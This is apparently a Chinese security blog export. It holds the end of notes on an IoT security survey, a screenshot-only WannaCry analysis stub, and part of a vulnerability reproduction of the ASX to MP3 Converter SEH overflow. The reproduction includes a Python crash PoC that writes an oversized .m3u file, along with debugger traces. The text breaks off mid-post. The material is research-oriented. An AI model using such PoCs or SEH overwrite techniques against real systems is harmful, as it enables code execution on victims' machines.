通信中间件可以在异构设备和应用程序之间提供可靠的通信。在通信中间件中，基于RFID的中间件（Fosstrak [2]等），基于传感器网络的中间件（TinyREST [82]等）以及监控和数据采集（SCADA）是典型的示例。\n\n\t\t\t- （v）普适性中间件\n\n\t\t\t\t- 普适中间件是为普适计算环境设计的，并在多个异构平台上提供服务[93]。\n\n\t\t- 将中间件集成到物联网中，以下挑战需要解决的问题\n\n\t\t\t- （i）互操作性挑战是在通信和信息交换中连接异构设备\n\t\t\t- （ii）可扩展性挑战要在具有以下条件的小规模环境或大规模环境中有效地进行：可能涉及大量对象\n\t\t\t- （iii）抽象提供挑战是在各个级别提供抽象\n\t\t\t- （iv）自发交互挑战是为自发事件提供可靠的服务\n\t\t\t- （v）固定基础结构挑战是在不提供自定义事件的情况下提供可靠的服务\n\t\t\t- （vi）多重性挑战是支持设备间的同时通信，并从大量服务中选择或安排最适合设备的服务。\n\n\t\t- 物联网中间件应实现信任，安全和隐私\n\n\t- 资源管理和共享技术\n\n\t\t- 各种杂项neous网络已集成，可为物联网中的所有应用程序（智能交通，智能电网等）提供数据传输。\n\t\t- 为了降低成本，某些应用程序可以共享部分网络资源以提高其利用率。在这种情况下，确保各种应用程序请求的信息按时交付是物联网面临的挑战。\n\t\t- 现有的资源共享机制主要集中在频谱共享上，频谱共享用于有效地协调同一频率下的多个网络，以最大程度地利用网络资源\n\n\t\t\t- 频谱共享可以分为三个维度，包括时间，频率和空间。\n\n\t\t- 虽然大多数现有方案都是针对机器对机器或设备对设备通信而开发的，但物联网却专注于物对物网络\n\n\t\t\t- 其中“物”不仅指设备或机器，还指人行为和其他对象\n\t\t\t- 因此，跨异构网络设计一种适用于物联网环境的有效资源共享方案是未来发展的重大挑战。\n\n\t\t- 物联网中的原始数据由智能设备收集（RFID，传感器等），以及大多数这些智能设备受资源限制，无法从环境中获取能量。在资源管理中应考虑节能方案\n\n\t\t\t- 包括通过从分布式能源中收集能量来延长传感器寿命的方案[21]\n\t\t\t- 通过占空比方案来降低传感器能量的方案[98]\n\t\t\t- 基于能量的路由协议以平衡能量消耗并延长传感器网络的寿命[152]，[151]等\n\t\t\t- 尽管这些努力可以在节能和管理上很好地发挥作用，但适用于IoT的方案由异构网络组成的网络基础设施对于未来的研究也是一个悬而未决的挑战。\n\n### 第五节中介绍了物联网的安全和隐私问题\n\n- 物联网的安全性\n\n\t- 机密性\n\n\t\t- 机密性可以确保数据仅在整个过程中对授权用户可用，并且不能被未授权用户窃听或干扰。\n\t\t- 在物联网中，机密性是重要的安全原则，因为大量测量设备（RFID，传感器等）可以集成在物联网中。\n\t\t- 因此，至关重要的是确保测量设备收集的数据不会向其相邻设备泄露安全信息。\n\t\t- 为实现高度机密性，应开发和使用增强的技术，包括安全密钥管理机制和其他技术[22]\n\n\t- 完整性\n\n\t\t- 完整性可以确保在通信网络中的数据传递过程中，数据不会被有意或无意的干扰所篡改，最终为授权用户提供准确的数据。\n\t\t- 完整性对于物联网非常重要，因为如果物联网应用程序接收到伪造数据或篡改数据，则可以估计错误的运行状态并做出错误的反馈命令，这可能会进一步破坏物联网应用程序的运行。\n\t\t- 为了实现可接受的完整性，应开发并应用增强的安全数据完整性机制（错误的数据过滤方案等）[144]。\n\n\t- 可用性\n\n\t\t- 可用性可以确保数据和只要需要数据和设备，设备就可用于授权用户和服务。\n\t\t- 在物联网中，通常以实时方式请求服务，并且如果无法及时交付所请求的数据，则无法计划和提供服务。因此，可用性也是重要的安全原则。\n\t\t- 对可用性的最严重威胁之一是拒绝服务（DoS）攻击，应研究并应用增强技术（安全，高效的路由协议等）以确保IoT的可用性[83]。\n\n\t- 身份验证\n\n\t\t- 身份验证可以确保无法将未经授权的设备或应用程序连接到IoT，并且身份验证可以确保网络中传递的数据是合法的，并且请求数据的设备或应用程序也是合法的。\n\t\t- 在物联网中，很难识别和验证每个数据和对象，因为物联网包含大量不同的对象。\n\t\t- 因此，设计有效的机制来处理对象或事物的身份验证在物联网中至关重要[32]。\n\n\t- 隐私\n\n\t\t- 隐私可以确保数据只能由相应的用户控制，并且没有其他用户可以访问或处理数据。\n\t\t- 不同于旨在对数据进行加密而不会被未授权用户窃听和干预的机密性，隐私可确保用户只能基于接收到的数据进行某些特定控制，而不能从接收到的数据中推断出其他有价值的信息\n\t\t- 由于大量设备，服务和人们在IoT中共享同一通信网络，因此隐私被视为重要的安全原则之一。\n\n\t- 信任\n\n\t\t- 信任可以确保上述安全性不同对象，不同物联网层和不同应用程序之间的交互过程中要实现的隐私和隐私目标。\n\t\t- 物联网的信任目标\n\n\t\t\t- 每个物联网层之间的信任\n\t\t\t- 设备之间的信任\n\t\t\t- 设备和应用程序之间的信任\n\n\t\t- 有了信任，就可以实施安全性和隐私权。信任管理系统应设计为在物联网中实现这些信任目标。\n\n- 物联网架构各层中的安全挑战\n\n\t- 感知层\n\n\t\t- 1.节点捕获攻击\n\n\t\t\t- 在节点捕获攻击中，攻击者可以通过物理上替换整个节点或篡改节点或设备的硬件来捕获和控制IoT中的节点或设备[163]\n\t\t\t- 如果节点受到节点捕获攻击的威胁，则重要信息（组通信密钥，单选密钥，匹配密钥等）可能会暴露给对手\n\t\t\t- 攻击者还可以将与捕获的节点关联的重要信息复制到恶意节点，然后将恶意节点伪造为授权节点以连接到IoT网络或系统。将该攻击称为节点复制攻击。\n\t\t\t- 节点捕获攻击可能会对网络造成严重影响。为了防御节点捕获攻击，需要研究有效的方案来监视和检测恶意节点[15]。\n\n\t\t- 2.恶意代码注入攻击\n\n\t\t\t- 除通过恶意攻击捕获节点外，攻击者可以通过将恶意代码注入节点或设备的内存中来控制物联网中的节点或设备，这被称为恶意代码注入攻击[143]。\n\t\t\t- 注入的恶意代码不仅可以执行特定功能，而且还可以授予对手进入IoT系统的权限，甚至可以完全控制IoT系统。\n\t\t\t- 为了抵御恶意代码注入攻击，需要设计有效的代码身份验证方案并将其集成到IoT [143]，[115]。\n\n\t\t- 3.错误的数据注入攻击\n\n\t\t\t- 使用捕获的节点攻击者可以注入虚假数据来代替由捕获的节点或设备测得的正常数据，并将虚假数据传输到物联网应用程序[144]。\n\t\t\t- 物联网应用收到虚假数据后，会返回错误的反馈命令或提供错误的服务，进一步影响物联网应用和网络的有效性。\n\t\t\t- 为了抵御这种恶意攻击，需要设计可以在IoT应用程序接收数据之前有效检测并删除错误数据的技术（错误数据过滤方案等）[72]，[71]。 \n\n\t\t- 4.重播攻击（或新鲜度攻击）\n\n\t\t\t- 在物联网中，攻击者可以使用恶意节点或设备将合法标识信息传输到目标主机，该合法标识信息已由目标主机接收，以便使恶意节点或设备获得物联网的信任[90]，[163]。\n\t\t\t- 重播攻击通常在身份验证过程中发起，以破坏证书的有效性。\n\t\t\t- 为了减轻重放攻击，应在物联网中设计和开发技术（安全时间戳方案等）\n\n\t\t- 5.密码分析攻击和侧信道攻击\n\n\t\t\t- 密码分析攻击可以使用获得的密文或明文来推断加密算法中使用的加密密钥[158]。\n\t\t\t- 但是，密码分析攻击的效率很低。为了提高效率，对手可以引入新的攻击，即边路攻击。\n\t\t\t- 在物联网[138]中调查的边信道攻击中，对手可以在物联网的加密设备上部署一些技术以获得加密密钥，该密钥在物联网中用于加密数据和解密数据。\n\t\t\t- 定时攻击是一种典型的旁信道攻击，在这种攻击中，对手可以通过分析执行加密算法所需的时间信息来获取加密密钥。\n\t\t\t- 为了减轻侧信道攻击，需要在物联网中开发有效且安全的加密算法和密钥管理方案[22]。\n\n\t\t- 6.窃听和干扰\n\n\t\t\t- 因为大多数物联网中的犯罪分子将通过无线网络进行通信，其脆弱性在于无线链接中传递的信息可能会被未经授权的用户窃听[164]，[42]\n\t\t\t- 为了处理窃听，需要安全的加密算法和密钥管理方案。\n\t\t\t- 对手还可以发送噪声数据或信号，以干扰无线链路中传递的信息。\n\t\t\t- 为了确保数据的准确性和及时性，需要有效的安全噪声过滤方案来过滤噪声数据并恢复原始数据[91]。\n\n\t\t- 7.睡眠剥夺攻击\n\n\t\t\t- 在物联网中，大多数设备或节点具有低功耗能力。为了延长设备和节点的生命周期，对设备或节点进行编程以遵循睡眠例程以减少功耗\n\t\t\t- 但是，睡眠剥夺攻击可能会破坏已编程的睡眠例程，并使设备或节点一直处于唤醒状态，直到它们被关闭。\n\t\t\t- 为了延长这些设备和节点的生命周期，能量收集方案可以是一种可能的解决方案，其中设备和节点可以从外部环境（太阳能等[21]）中收集能量。\n\t\t\t- 此外，还需要在物联网中研究其他技术，例如缓解占空比剥夺攻击的安全占空比机制。 \n\n\t- 网络层\n\n\t\t- 1.拒绝服务（DoS）攻击\n\n\t\t\t- DoS攻击可以通过攻击网络协议或用大量流量轰炸IoT网络来总结IoT中的所有可用资源，从而使IoT系统的服务不可用[84]。\n\t\t\t- DoS攻击被认为是最常见的攻击之一，代表了一种攻击类别，可能导致IoT系统的服务不可用。\n\t\t\t- 攻击可以通过包括死亡Ping，TearDrop，UDP泛洪，SYN泛洪，陆地攻击等在内的攻击方案来产生\n\t\t\t- 为了防御DoS攻击，首先需要仔细研究攻击方案，然后再研究有效的防御方案以减轻威胁需要开发攻击来保护物联网系统[83]。\n\n\t\t- 2.欺骗攻击\n\n\t\t\t- 欺骗攻击的目的是使对手获得对物联网系统的完全访问权，并将恶意数据发送到系统中[8]。\n\t\t\t- 在物联网中，欺骗攻击的示例包括IP欺骗[92]，RFID欺骗[89]等。\n\n\t\t\t\t- 在IP欺骗攻击中，攻击者可以欺骗并记录IoT中其他授权设备的有效IP地址，然后访问物联网系统使用获取的有效IP地址发送恶意数据，使恶意数据看起来有效。\n\t\t\t\t- 在RFID欺骗攻击中，对手可以欺骗并记录有效RFID标签的信息，然后将具有此有效标签ID的恶意数据发送到IoT系统。\n\n\t\t\t- 安全的信任管理，标识和身份验证可能是防御欺骗攻击的可能解决方案[32]，[28]。\n\n\t\t- 3.槽洞攻击（Sinkhole Attacks）\n\n\t\t\t- 在槽洞攻击中，设备或节点要求具有强大的功能，计算和通信功能，因此，由于其吸引力，更多相邻的设备或节点将在数据路由过程中选择受损的设备或节点作为转发节点[118]\n\t\t\t- 通过这样做，受感染的设备或节点可以增加在IoT系统中传输数据之前获得的数据量。\n\t\t\t- 请注意，漏洞攻击不仅可以破坏所传递数据的机密性，而且可以成为发起其他攻击（DoS攻击等）的基本步骤。\n\t\t\t- 为了槽洞攻击，需要研究和应用诸如安全多个路由协议之类的技术[57]\n\n\t\t- 4.虫洞攻击（Wormhole Attacks）\n\n\t\t\t- 可以发起虫洞攻击物联网中的两个协作恶意设备或节点，其中位于不同位置的两个恶意设备可以与专用链路交换路由信息，以实现它们之间的虚假一跳传输，即使它们彼此之间的距离很远[67] 。\n\t\t\t- 在蠕虫攻击中，由于减少了转发跳数，因此将通过这两个恶意设备或节点传递更多数据。通过访问更多传递的数据，虫洞攻击可导致与污水坑攻击类似的破坏。\n\t\t\t- 为了抵御虫洞攻击，有一些可能的防御技术。\n\n\t\t\t\t- 一种技术是修改路由协议以增强路由选择过程中的安全性[26]，\n\t\t\t\t- 而其他技术则涉及部署安全硬件（GPS，定向天线等）。\n\n\t\t- 5.中间人攻击\n\n\t\t\t- 在中间人攻击中，由对手控制的恶意设备可以虚拟地定位在物联网中的两个通信设备之间[97]。通过窃取两个正常设备的标识信息，恶意设备可以成为存储和转发在这两个正常设备之间通信的所有数据的中间设备，而两个正常设备无法检测到恶意设备的存在，并且而是相信他们直接相互交流。\n\t\t\t- 遭受中间攻击的人可能侵犯机密性，完整性和隐私性通过监视，窃听，篡改和控制两个普通设备之间的通信来控制物联网中受限制的数据。\n\t\t\t- 与需要物理篡改设备硬件的恶意节点捕获攻击不同，可以仅依靠物联网网络中使用的通信协议来发动中间攻击。\n\t\t\t- 安全的通信协议和密钥管理方案可以确保正常设备的标识和密钥信息不泄露给对手，可以作为一种有效的防御技术来防御攻击[83]，[22]。\n\n\t\t- 6.路由信息攻击\n\n\t\t\t- 路由信息攻击着重于物联网系统中的路由协议，其中路由信息可以由对手操纵和发送，以在网络数据传输中创建路由环路，从而导致源路径的扩展和端到端的增加物联网网络的最终延迟[8]\n\t\t\t- 为了防御路由信息攻击，可以使用安全的路由协议和信任管理来在IoT中的设备之间建立安全链接，并确保标识信息和IP地址不泄漏给对手。\n\n\t\t- 7.Sybil（女巫）攻击\n\n\t\t\t- 在sybil攻击中，是一种恶意设备，即sybil设备，可以声明多个合法身份并在IoT系统中模拟它们[8]，[96]，[159]。\n\t\t\t- 由于sybil设备具有多个合法身份，因此sybil设备发送的虚假数据很容易被其良性相邻设备接受。\n\t\t\t- 同样，选择sybil设备作为转发节点的路由可能会考虑确定了几个不同的相交路径，但实际上，仅确定了一条路径，所有传输的数据都需要通过sybil设备，在其中可以使用干扰和DoS。\n\t\t\t- 为了抵御sybil攻击，需要为物联网系统开发安全的识别和认证机制[32]。\n\n\t\t- 8.未经授权的访问\n\n\t\t\t- RFID是物联网中一项重要的使能技术。但是，由于大量基于RFID的设备已集成在IoT中，并且大多数RFID标签缺乏适当的身份验证机制，因此，RFID标签可以被访问，并且标签中存储的信息可以通过以下方式获取，修改和删除。\n\t\t\t- 因此，物联网中基于RFID的设备的授权访问和认证机制是需要进一步开发的挑战[56]。\n\n\t- 应用层\n\n\t\t- 1.网络钓鱼攻击\n\n\t\t\t- 在网络钓鱼攻击中，攻击者可以通过受感染的电子邮件和网络钓鱼网站欺骗用户的身份验证凭据，从而获得用户的机密数据，例如标识和密码，[8]，[54]。\n\t\t\t- 安全的授权访问，识别和身份验证可以缓解网络钓鱼攻击[8]。\n\t\t\t- 尽管如此，最有效的方法是让用户自己在上网时始终保持警惕。\n\n\t\t- 2.恶意病毒/蠕虫\n\n\t\t\t- 恶意病毒/蠕虫是物联网应用的另一个挑战[8]，[128]，[155]。攻击者可以使用恶意的自我传播攻击（蠕虫，特洛伊木马等）感染IoT应用程序，然后获取或篡改机密数据。\n\t\t\t- 需要部署可靠的防火墙，病毒检测和其他防御机制来对抗物联网应用程序中的恶意病毒/蠕虫攻击[111]。\n\n\t\t- 3.恶意脚本\n\n\t\t\t- 恶意脚本代表为损害物联网的系统功能而添加到软件中，在软件中进行修改以及从软件中删除的脚本[8]。\n\t\t\t- 由于所有物联网应用程序都已连接到Internet，因此在通过Internet请求服务时，对手可以轻松地欺骗客户运行恶意脚本（Java攻击小程序，active-x脚本等）。\n\t\t\t- 恶意脚本可能造成机密数据的泄漏，甚至导致整个系统关闭。为了防御恶意脚本，需要在IoT系统中部署有效的脚本检测技术，包括蜜罐技术，静态代码检测和动态动作检测。\n\n- 隐私问题\n\n\t- 所有收集和使用的海量数据物联网应经历以下三个步骤\n\n\t\t- （i）数据收集\n\t\t- （ii）数据聚合[130]\n\t\t- （iii）数据挖掘与分析[126]，[166]。\n\n\t- 这些步骤中数据的隐私问题也在IoT中引起了。作为物联网的新挑战，隐私可能导致财产损失，甚至危及人类安全[145]，[107]。\n\t- 根据不同的数据处理步骤，隐私保护机制可以分为三类：\n\n\t\t- （i）数据收集中的隐私保护[65]，\n\t\t- （ii）数据聚合中的隐私保护\n\n\t\t\t- 很难通过传统的加密机制来实现隐私保护\n\t\t\t- （i）基于匿名的隐私保护[105]\n\n\t\t\t\t- 在基于匿名的隐私保护中，在数据聚合过程中使用了几种相关的匿名技术（K匿名，L分集，T紧密度等）来保护标识信息的隐私[106]\n\t\t\t\t- 另外，流量分析技术可能会影响匿名通信系统[149]，[76]，\n\n\t\t\t- （ii）基于加密的隐私保护[39]\n\n\t\t\t\t- 在基于加密的隐私保护中，数种加密技术（同态加密，承诺机制，秘密共享，零知识证明等）被用于数据聚合中，以确保不会被对手窃听数据[39]。\n\t\t\t\t- 但是，现有的加密技术只能在数据传输中实现机密性，而在隐私保护方面可能无法很好地发挥作用。\n\n\t\t\t- （iii）基于干扰的隐私保护\n\n\t\t\t\t- 在基于扰动的隐私保护中，基于扰动的技术（数据定制，数据共享，随机噪声注入等）被用于数据聚合中以扰动原始数据，从而实现了隐私保护[48]\n\t\t\t\t- 但是，数据的实用性可能会阻碍该技术在物联网中的应用\n\t\t\t\t- 基于干扰的隐私保护方案是物联网中非常流行的技术。但是，大多数基于扰动的隐私保护通过减少数据的实用性来实现出色的性能。效用较低时，数据可能无法或可能仅部分支持IoT应用程序请求的服务\n\n\t\t- （iii）数据挖掘和分析中的隐私保护[135]，[20]\n\n\t- IoT当前在隐私保护方面所做的大部分努力都集中在数据聚合中的数据隐私上\n\t- 具有巨大数据实用性的隐私保护方案的设计仍然是物联网中数据隐私保护方面的巨大挑战，需要进一步研究\n\n### 第六节中介绍了物联网和雾/边缘计算的集成\n\n![截屏2019-10-24上午10.42.40](https://tva1.sinaimg.cn/large/006y8mN6ly1g893egitkvj30h409q40h.jpg)\n\n- A.概述\n\n\t- 事物产生的信息需要大数据收集和处理所有产生和收集的信息，并将其转化为有用的信息。\n\t- 大数据需要物联网的支持，因为物联网支持的大量传感和激励数据（智能网格，智能交通等）面临挑战。\n\t- 此外，物联网应用中收集的数据通常是非结构化数据，需要进一步分析以提取有用的信息。\n\t- 在物联网中，连续的数据流将影响各种组织中的数据存储容量。将需要其他数据中心来处理从物联网应用程序收集的数据负载。\n\n\t\t- 一种可能的解决方案是通过利用平台即服务（PaaS）将数据移动到云中\n\t\t- 当组织选择技术用于在执行大数据处理和分析时，需要考虑物联网数据的性质\n\t\t- Hadoop和Hive可用于处理大数据。但是，对于IoT应用程序收集的数据，NoSQL文档数据库（Apache CouchDB等）可能是合适的[33]。\n\n\t\t\t- 这是因为NoSQL文档数据库可以提供高吞吐量和低延迟\n\t\t\t- Apache Kafka是一种用于中间消息代理的物联网工具，可用于实时流处理。大数据的安全性也将受到物联网的影响\n\n- B.基于雾/边缘计算的物联网云\n\n\t- 在许多IoT / CPS应用程序中，需要有效地存储，处理和分析来自跨越大地理区域的大量事物和对象的数据。为了弥补这一差距，雾/边缘计算能够将云计算扩展到更接近其支持的事物\n\t- 雾/边缘计算可以在网络边缘为设备（节点）提供计算和存储服务，而不是在云中心进行所有计算。\n\t- 雾/边缘计算节点可以是具有以下功能的任何网络设备：具有存储，计算和网络连接（路由器，交换机，视频监控摄像机，服务器等）的功能\n\n\t\t- 这些设备可以部署在具有网络连接的任何位置，并从IoT收集数据与物联网应用程序关联的设备。\n\t\t- 可以根据性能要求将不同类型的IoT数据定向到适当的位置进行进一步分析。\n\t\t- 可以在最接近生成数据的IoT设备的雾/边缘计算节点上处理需要立即处理的高优先级数据。\n\t\t- 不对延迟敏感的低优先级数据可以定向到某些聚合节点，以进行进一步的处理和分析。\n\n\t- 将雾/边缘计算与物联网集成存在一些挑战\n\n\t\t- 一个可能的挑战是如何有效地管理雾/边缘计算基础架构并将可用资源分配给物联网设备。\n\n\t\t\t- 每次都可以通过IoT设备请求大量服务，并且每个雾/边缘服务节点仅具有有限的计算和存储能力。\n\t\t\t- 在这种情况下，应该对所有雾/边缘节点进行最佳管理，并为物联网设备（或群集中的一组物联网设备）分配有效的服务\n\n\t\t- 另一个挑战是如何有效地管理雾/边缘计算资源\n\n\t\t\t- 尽管先前的挑战着重于雾/边缘节点与物联网服务之间的接口，但这一挑战着重于雾/边缘节点之间的资源管理。\n\n\t\t- 基于雾/边缘计算的物联网中资源分配的挑战\n\n\t\t\t- 终端设备和雾/边缘节点之间的资源分配\n\t\t\t- 雾/边缘节点之间的资源分配\n\n### 第七节 应用  如何在实际应用中实现基于雾/边缘计算的物联网\n\n- A.智能电网\n\n\t- 在智能电网中，引入了分布式能源发生器以提高分布式能源的利用率\n\t- 引入了电动汽车以提高能量存储能力并减少了CO2的排放\n\t- 引入了智能电表和双向通信网络以实现客户与公用事业提供商之间的互动这一目标\n\t- 借助雾/边缘计算基础架构，可以存储和处理从智能电表收集的大量数据，从而可以支持智能电网的有效运行。\n\t- 利用交互信息，公用事业提供商可以优化电网的能源分配，客户可以优化其能源消耗，从而提高资源利用率并降低成本\n\t- 有效的安全机制需要为智能电网开发可在数据收集和传输过程中保持数据隐私性和完整性的工具\n\n- B.智慧交通\n\n\t- 能交通信息系统（ITS）是另一种典型的基于IoT-CPS的应用，其中集成了智能交通管理，控制系统，通信网络和计算技术，以使交通系统可靠，高效和安全[74]。\n\t- 通过对基于雾/边缘计算的IoT基础架构中的车辆网络和雾/边缘计算节点发起恶意攻击，并通过通信与其他车辆共享误导的交通状况数据，对手可能会侵入系统并控制车辆中的ECU在受损车辆[141]，[12]中部署的接口。\n\n- C.智慧城市\n\n\t- 它旨在通过引入信息和通信技术（ICT）解决方案来管理公共事务[156]。\n\t- 智慧城市可以更有效地利用公共资源，从而改善了为用户提供的服务质量，并降低了公共管理者的运营成本[156]，[53]\n\t- 物联网/ CPS应用程序，旨在实现城市中公共资源的最佳利用\n\n","tags":["论文"],"categories":["工控"]},{"title":"永恒之蓝（待完善）","url":"/2021/01/25/永恒之蓝/","content":"\n开始准备后桌面\n\n![截屏2019-12-25下午8.00.21](https://tva1.sinaimg.cn/large/006tNbRwly1ga995azo1ij31fe0u0hdt.jpg)\n\n查壳\n\n![image-20191225211808440](https://tva1.sinaimg.cn/large/006tNbRwly1ga9a6dpzqqj311z0u07n6.jpg)\n\n<!-- more -->\n\n![截屏2019-12-25下午8.02.06](https://tva1.sinaimg.cn/large/006tNbRwly1ga995pyht1j31fe0u0x2b.jpg)\n\n运行后生成文件\n\n![截屏2019-12-25下午8.05.59](https://tva1.sinaimg.cn/large/006tNbRwly1ga996dcqtcj31fe0u0dpv.jpg)\n\n后果\n\n![截屏2019-12-25下午8.20.42](https://tva1.sinaimg.cn/large/006tNbRwly1ga996m8tn0j31ee0u04qp.jpg)\n\n![截屏2019-12-25下午8.24.12](https://tva1.sinaimg.cn/large/006tNbRwly1ga996pp3ewj311z0u0tfm.jpg)\n\n##静态基础分析\n\n\n\n查看字符串\n\n![截屏2019-12-26下午5.18.08](https://tva1.sinaimg.cn/large/006tNbRwly1gaa8xrpeycj31gj0u0grh.jpg)\n\n![image-20191226172208609](https://tva1.sinaimg.cn/large/006tNbRwly1gaa8z58ll9j31qe0ag75h.jpg)\n\npeid识别加密算法\n\n![image-20191225213044233](https://tva1.sinaimg.cn/large/006tNbRwly1gbcgqz9e5zj311z0u0qbl.jpg)\n\n查找导入表\n\n![截屏2019-12-26下午5.32.39](https://tva1.sinaimg.cn/large/006tNbRwly1gbda7ldlcnj318i0cg406.jpg)\n\n![截屏2019-12-26下午5.32.39](/Users/fstark/Desktop/截屏2019-12-26下午5.33.41.png)\n\n![截屏2019-12-26下午5.36.07](https://tva1.sinaimg.cn/large/006tNbRwly1gbda7y1dlij317c0og79g.jpg)\n\n![截屏2019-12-26下午5.38.27](https://tva1.sinaimg.cn/large/006tNbRwly1gbda86vmqpj317c0ogtem.jpg)\n\n![截屏2019-12-26下午5.38.52](https://tva1.sinaimg.cn/large/006tNbRwly1gbda8h8qaxj317c0og429.jpg)\n\n基础动态分析\n\n![截屏2019-12-26下午5.51.25](https://tva1.sinaimg.cn/large/006tNbRwly1gbda8vznr1j31n60u0qht.jpg)\n\n![截屏2019-12-26下午6.01.30](https://tva1.sinaimg.cn/large/006tNbRwly1gbda93n2jej31n60u07ec.jpg)\n\n![截屏2019-12-26下午7.54.46](https://tva1.sinaimg.cn/large/006tNbRwly1gbda9bn2nij31n60u07cv.jpg)\n\n![截屏2019-12-26下午8.00.11](https://tva1.sinaimg.cn/large/006tNbRwly1gbda9im4j0j31n60u0dnd.jpg)\n\n![截屏2019-12-26下午8.11.33](https://tva1.sinaimg.cn/large/006tNbRwly1gbda9qkkzoj31n60u0aex.jpg)\n\n## ***使用IDA和OD进行详细分析***\n\n***\\*对wcry\\*******\\*.exe\\*******\\*病毒主程序的分析\\****\n\n![截屏2019-12-26下午8.33.03](/Users/fstark/Desktop/截屏2019-12-26下午8.33.03.png)\n\n![截屏2019-12-26下午8.33.50](https://tva1.sinaimg.cn/large/006tNbRwly1gbdae0tfzcj31nu0jy777.jpg)","tags":["漏洞复现","病毒分析"],"categories":["二进制"]},{"title":"ASX to MP3 Converter本地代码执行漏洞","url":"/2021/01/25/ASX to MP3 Converter本地代码执行漏洞/","content":"\n本文是针对ASX to MP3 Converter进行的漏洞分析\n\n<!-- more -->\n\n### 背景概述\n\n本来是浏览学长博客[ASX TO MP3本地代码执行漏洞](https://whereisk0shl.top/post/2016-11-04)感觉这个洞比较好入手，思路也比较清晰，就想着简单复现一下，但是在实际分析之中发现与博客原文写的有较大出入，于是自己一路分析上去，想搞清楚差异的地方探究真正的漏洞原因。\n\n实验环境与原博中一样：\n\nAsx to MP3 Converter 3.1.2（原博中写的是3.0.0，但提供的下载链接是3.1.2，是否是分析出现差异的原因？）\n\nWindows xp sp3\n\nWindbg\n\nIDA pro\n\nOD\n\n软件下载地址：https://www.exploit-db.com/apps/b31a84e79d9941d89336b6708ef52a20-ASXtoMP3Converter_3121.exe\n\n#### SEH攻击原理简述（详情可参考0day2）\n\n为了保证系统在遇到错误时不至于崩溃，仍能够健壮稳定地继续运行下去，Windows会对运行在其中的程序提供一次补救的机会来处理错误，这种机制称为Windows异常处理机制。S.E.H即异常处理结构体(Structure Exception Handler)S.E.H链表指针和异常处理函数句柄，共计8个字节。\n\nS.E.H结构体存放在系统栈中，线程初始化时，会自动向栈中安装S.E.H作为默认的异常处理。当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H中的异常处理函数进行处理。\n\n![image-20200417205721152](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx27wfgnrj30j00limzn.jpg)\n\n利用思路基本是：\n\n1. 通过溢出覆盖栈中SEH，将指向下一条记录的指针覆盖为shellcode地址；\n2. 触发一个SEH；\n3. 应用程序处理SEH时调用了指令，将指向下一条记录的指针作为EIP内容；\n4. 跳到shellcode地址，执行shellcode。\n\n\n\n### 原博中的分析思路复现\n\n利用poc生成一个畸形m3u文件，播放器打开文件，程序崩溃\n\nPoC:\n\n```python\npoc = \"\\x41\" * 50000\n\nrst = open(\"exploit.m3u\",'w')\nrst.write(poc)\nrst.close();\n```\n\n原文理想中的情况应该是：\n\n1.使用windbg到达漏洞现场，使用kb发现堆栈调用全是系统dll的调用，无法回溯漏洞发生前的关键函数，于是更改思路\n\n2.想到该漏洞是一个文件格式的poc，那么在主程序中很有可能会通过fopen调用这个poc打开，以读取其中的文件从而触发文件格式的漏洞，于是想办法通过fopen函数来定位到漏洞发生前的函数\n\n3.在IDA Pro中找到5个fopen的字符串函数，在这几个地址处用windbg打断点\n\n4.发现在加载漏洞文件后windbg调用了fopen两次，第一次正常，在第二次时将畸形的文件格式读入到缓冲区中，而此时没有对文件的长度进行任何检查，而是直接读入缓冲区\n\n5.继续运行再调用后续函数时，返回地址被覆盖，导致出现一个错误，调出SEH，而SEH已经被覆盖，最终程序结束\n\n最终得出结论：<u>由于对于filename的长度检查不严格，导致直接作为参数回调到外层函数中，因此当外层函数结束时，程序返回到一个不可读的地址，从而触发了异常处理流程，因为文件畸形内容，导致了SEH指针被覆盖，程序可控。</u>\n\n\n\n我按照此思路复现实际遇到的情况：\n\n1.使用windbg达到漏洞现场，发现可以回溯漏洞发生前的关键函数，断在了00430402的位置\n\n![image-20200416171026626](https://tva1.sinaimg.cn/large/007S8ZIlly1gdvq1jbwu6j313m0ldwqm.jpg)\n\n2.在IDA中同样搜寻到5个fopen的调用并在windbg中对应打了断点，但是在实际调用中加载漏洞文件后windbg调用了fopen仅1次而不是2次，之后又会断在00430402\n\n![image-20200417230817139](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx60i2881j31680n0gxo.jpg)\n\n3.使用OllyDbg分析程序崩溃位置也与原博不同，原博程序是在执行到最后ret 4时，跳转地址被覆盖为414141不可读出现错误，实际调试过程中并未执行到该函数段最后，而是在过程中读写错误崩溃的，具体原因是：\n\n0042BD1D  |mov ecx,dword ptr ss:[esp+0xAA48]  ；堆栈 ss:[000DBFB4]=41414141  \n\n0042BD26  |push ecx ；堆栈000D1568   41414141  AAAA\n\n004303E9  | mov ebx,dword ptr ss:[esp+0x10]  ；堆栈 ss:[000D1568]=41414141\n\n004303FE  | mov esi,ebx ；ebx=41414141\n\n00430402  |rep movs dword ptr es:[edi],dword ptr ds:[esi]  ；ds:[esi]=[41414141]=???\n\n在执行rep movs操作中由于414141地址不可读导致出错，并且此时SEH已然被覆盖了\n\n![image-20200417234729856](https://tva1.sinaimg.cn/large/007S8ZIlly1gdx74xnmd2j30pz0hejsy.jpg)\n\n\n\n#### 此时的疑问\n\n1.既然没有第二次fopen依然崩溃，问题可能并不出在fopen操作，那么问题出在哪？\n\n2.从图中可知SEH已经被覆盖，那么是在之前何处覆盖的？操作是什么？\n\n\n\n此时我发现不止有我对此质疑，网上另一篇帖子也无法复现，和我的情况完全相同，为我提供了下一步的思路\n\n[漏洞分析——ASX to MP3 Converter本地代码执行漏洞]([https://ayesawyer.github.io/2019/07/08/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94ASX-to-MP3-Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/](https://ayesawyer.github.io/2019/07/08/漏洞分析——ASX-to-MP3-Converter本地代码执行漏洞/))\n\n\n\n### 